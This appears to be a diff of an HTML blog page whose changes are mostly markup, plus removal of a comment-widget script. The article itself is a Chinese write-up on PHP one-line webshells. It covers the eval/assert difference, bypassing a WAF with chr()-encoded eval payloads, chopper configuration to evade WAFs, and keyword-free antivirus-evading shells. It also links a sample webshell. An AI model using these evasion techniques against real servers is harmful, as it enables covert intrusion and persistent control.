@@ -117,7 +117,7 @@
 
         <span itemprop="articleBody"><h3 id="0x00-eval和assert的区别">0x00 eval和assert的区别</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>http://www.vuln.cn/8395
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.vuln.cn/8395
 http://www.php.net/manual/zh/function.eval.php
 http://php.net/manual/zh/functions.variable-functions.php
 
@@ -164,12 +164,11 @@ b)assert("echo 1")是不可执行的,因为assert不能执行echo,eval("echo 1")
 c)assert("print_r(1);print_r(2);")或assert("print_r(1);print_r(2)")都只能执行print_r(1),assert只会执行到第一个
 分号内的语句
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="0x01-一个waf的绕过过程">0x01 一个waf的绕过过程</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>1.waf过滤大部分关键字,eg.base64_decode,``,system等
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.waf过滤大部分关键字,eg.base64_decode,``,system等
 
 2.尝试用如下方法绕过[uri=mytag_js.php?aid=9527],是个assert类型的webshell,通过echo不能执行,print_r可以执行判断出
 不是eval类型webshell
@@ -215,12 +214,11 @@ eval('$a=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(
 
 9.在waf阻拦下无法连接一句话chopper时,每种waf的阻拦规则不一样,可在新版chopper目录下放多个不同的可过waf的配置文件
 备用,一个caidao.conf不过狗时再用其他caidao.conf,有效配置为"caidao.conf"文件
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="0x02-免杀无特征无关键字一句话">0x02 免杀无特征无关键字一句话</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>1.用chr(%d)^chr(%d)代替上面的chr
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.用chr(%d)^chr(%d)代替上面的chr
 
 for($i=1;$i&lt;=200;$i++)
 {echo 'chr(19)^chr('.$i.') is:';
@@ -277,16 +275,14 @@ f)最后将cmd=xxxxxxxxxxxx 在hackbar中post出去,其中xxxxxxxxx是e中编码
 a)传输的数据是base64加密过的没有任何关键字的数据
 b)服务端一句话没有任何关键字
 c)利用方式不是很方便
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="0x03-相关链接">0x03 相关链接</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>1.mytag_js.php样本文件及分析
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.mytag_js.php样本文件及分析
 样本文件:https://github.com/3xp10it/webshell/tree/master/mytag_js
 相关分析:http://www.nxadmin.com/penetration/1168.html
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Attention:首发于360播报,版权归360播报所有</p>
 </span>
@@ -326,16 +322,6 @@ c)利用方式不是很方便
 
 
 
-      
-<!--PC和WAP自适应版-->
-<div id="SOHUCS" style="width:980px"></div> 
-<script type="text/javascript"> 
-(function(){ 
-var appid = 'cyt1tnTcP'; 
-var conf = 'prod_a926ede5ea067744d582783ccd509c1f'; 
-var width = window.innerWidth || document.documentElement.clientWidth; 
-if (width < 960) { 
-window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="http://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("http://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
       
 
 
